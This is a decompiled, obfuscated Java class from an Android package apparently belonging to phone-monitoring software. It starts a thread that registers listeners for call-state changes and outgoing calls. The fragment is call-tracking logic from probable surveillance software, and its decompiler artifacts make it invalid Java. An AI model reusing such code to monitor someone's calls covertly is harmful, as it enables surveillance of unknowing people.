package com.vvt.callhandler;

import android.content.Context;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.vvt.callhandler.phonestate.OutgoingCallReceiver;
import com.vvt.callhandler.phonestate.a;

class d
  implements Runnable
{
  d(c paramc) {}
  
  public void run()
  {
    Looper.prepare();
    Object localObject1 = this.a;
    Object localObject2 = (TelephonyManager)c.a(this.a).getSystemService("phone");
    c.a((c)localObject1, (TelephonyManager)localObject2);
    localObject2 = this.a;
    localObject1 = new com/vvt/callhandler/phonestate/a;
    c localc = this.a;
    ((a)localObject1).<init>(localc);
    c.a((c)localObject2, (a)localObject1);
    localObject2 = c.c(this.a);
    localObject1 = c.b(this.a);
    ((TelephonyManager)localObject2).listen((PhoneStateListener)localObject1, 32);
    localObject2 = this.a;
    localObject1 = Looper.myLooper();
    c.a((c)localObject2, (Looper)localObject1);
    OutgoingCallReceiver.a(this.a);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */